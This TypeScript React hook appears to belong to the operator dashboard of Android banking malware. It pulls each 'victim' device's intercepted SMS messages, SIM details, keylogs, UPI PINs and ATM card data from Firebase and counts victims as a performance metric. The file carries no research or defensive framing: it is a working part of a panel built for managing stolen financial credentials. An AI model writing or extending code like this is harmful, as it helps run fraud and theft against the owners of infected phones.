import { useState, useEffect, useCallback } from 'react';
import { DeviceInfo, Message, SimRow, KeyLog, ATMCard } from '@/data/db';
import { firebaseService } from '@/lib/firebaseService';
import { parseTime } from '@/utils/time';

export function useDB() {
  const [db, setDb] = useState<{
    DeviceInfo: Record<string, DeviceInfo>;
    Messages: Record<string, Message>;
    Sims: Record<string, SimRow[]>;
    KeyLogs: Record<string, KeyLog[]>;
    UPIPins: Record<string, string[]>;
    ATMCards: Record<string, ATMCard[]>;
  }>({
    DeviceInfo: {},
    Messages: {},
    Sims: {},
    KeyLogs: {},
    UPIPins: {},
    ATMCards: {}
  });

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Initialize Firebase and load data
  useEffect(() => {
    const initializeData = async () => {
      try {
        setLoading(true);
        setError(null);

        // Initialize empty collections if needed
        await firebaseService.initializeEmptyCollections();

        // 1) Fetch top-level collections first
        const devices = await firebaseService.getDevices();
        const messages = await firebaseService.getMessages();

        // 2) Then fetch per-device collections in parallel using the fetched IDs
        const deviceIds = Object.keys(devices || {});

        const [sims, keyLogs, upiPins, atmCards] = await Promise.all([
          Promise.all(
            deviceIds.map(async (deviceId) => {
              const deviceSims = await firebaseService.getSims(deviceId);
              return [deviceId, deviceSims] as const;
            })
          ).then((entries) => Object.fromEntries(entries)),
          Promise.all(
            deviceIds.map(async (deviceId) => {
              const deviceKeyLogs = await firebaseService.getKeyLogs(deviceId);
              return [deviceId, deviceKeyLogs] as const;
            })
          ).then((entries) => Object.fromEntries(entries)),
          Promise.all(
            deviceIds.map(async (deviceId) => {
              const deviceUPIPins = await firebaseService.getUPIPins(deviceId);
              return [deviceId, deviceUPIPins] as const;
            })
          ).then((entries) => Object.fromEntries(entries)),
          Promise.all(
            deviceIds.map(async (deviceId) => {
              const deviceATMCards = await firebaseService.getATMCards(deviceId);
              return [deviceId, deviceATMCards] as const;
            })
          ).then((entries) => Object.fromEntries(entries))
        ]);

        setDb({
          DeviceInfo: devices,
          Messages: messages,
          Sims: sims,
          KeyLogs: keyLogs,
          UPIPins: upiPins,
          ATMCards: atmCards
        });
      } catch (err) {
        console.error('Error initializing data:', err);
        setError('Failed to load data from Firebase');
      } finally {
        setLoading(false);
      }
    };

    initializeData();
  }, []);

  // Set up real-time listeners
  useEffect(() => {
    if (loading) return;

    // Device updates
    const unsubscribeDevices = firebaseService.onDevicesUpdate((devices) => {
      setDb((prev) => ({ ...prev, DeviceInfo: devices }));
    });

    // Message updates
    const unsubscribeMessages = firebaseService.onMessagesUpdate((messages) => {
      setDb((prev) => ({ ...prev, Messages: messages }));
    });

    // Cleanup listeners
    return () => {
      unsubscribeDevices();
      unsubscribeMessages();
    };
  }, [loading]);

  // Get messages for a specific victim, sorted by time (newest first)
  const getVictimMessages = useCallback((victimId: string): Message[] => {
    return Object.values(db.Messages)
      .filter((msg) => msg.VictimId === victimId)
      .sort((a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime());
  }, [db.Messages]);

  // Get all messages sorted by time (newest first)
  const getAllMessages = useCallback((): Message[] => {
    return Object.values(db.Messages).sort(
      (a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime()
    );
  }, [db.Messages]);

  // Get recent messages (limit 5)
  const getRecentMessages = useCallback((): Message[] => {
    return getAllMessages().slice(0, 5);
  }, [getAllMessages]);

  // Get SIM data for a victim
  const getSims = useCallback((victimId: string): SimRow[] => {
    return db.Sims[victimId] || [];
  }, [db.Sims]);

  // Get key logs for a victim
  const getKeyLogs = useCallback((victimId: string): KeyLog[] => {
    return db.KeyLogs[victimId] || [];
  }, [db.KeyLogs]);

  // Get UPI pins for a victim
  const getUPIs = useCallback((victimId: string): string[] => {
    return db.UPIPins[victimId] || [];
  }, [db.UPIPins]);

  // Get ATM cards for a victim
  const getATMCards = useCallback((victimId: string): ATMCard[] => {
    return db.ATMCards[victimId] || [];
  }, [db.ATMCards]);

  // Calculate KPIs
  const getKPIs = useCallback(() => {
    const totalVictims = Object.keys(db.DeviceInfo).length;
    const inboxMessages = Object.values(db.Messages).filter((msg) => msg.SmsType === 'INBOX')
      .length;
    const lowBatteryDevices = Object.values(db.DeviceInfo).filter((device) => {
      const battery = parseInt(device.Battery?.replace('%', '') || '100');
      return battery < 20;
    }).length;

    return {
      totalVictims,
      inboxMessages,
      lowBatteryDevices
    };
  }, [db.DeviceInfo, db.Messages]);

  // Firebase operations
  const addDevice = useCallback(async (deviceId: string, deviceInfo: DeviceInfo) => {
    try {
      await firebaseService.addDevice(deviceId, deviceInfo);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error adding device:', err);
      throw err;
    }
  }, []);

  const updateDevice = useCallback(async (deviceId: string, updates: Partial<DeviceInfo>) => {
    try {
      await firebaseService.updateDevice(deviceId, updates);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error updating device:', err);
      throw err;
    }
  }, []);

  const deleteDevice = useCallback(async (deviceId: string) => {
    try {
      await firebaseService.deleteDevice(deviceId);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error deleting device:', err);
      throw err;
    }
  }, []);

  const addMessage = useCallback(async (message: Omit<Message, 'id'>) => {
    try {
      await firebaseService.addMessage(message);
      // Data will be updated automatically via real-time listener
    } catch (err) {
      console.error('Error adding message:', err);
      throw err;
    }
  }, []);

  return {
    db,
    loading,
    error,
    getVictimMessages,
    getAllMessages,
    getRecentMessages,
    getSims,
    getKeyLogs,
    getUPIs,
    getATMCards,
    getKPIs,
    addDevice,
    updateDevice,
    deleteDevice,
    addMessage
  };
}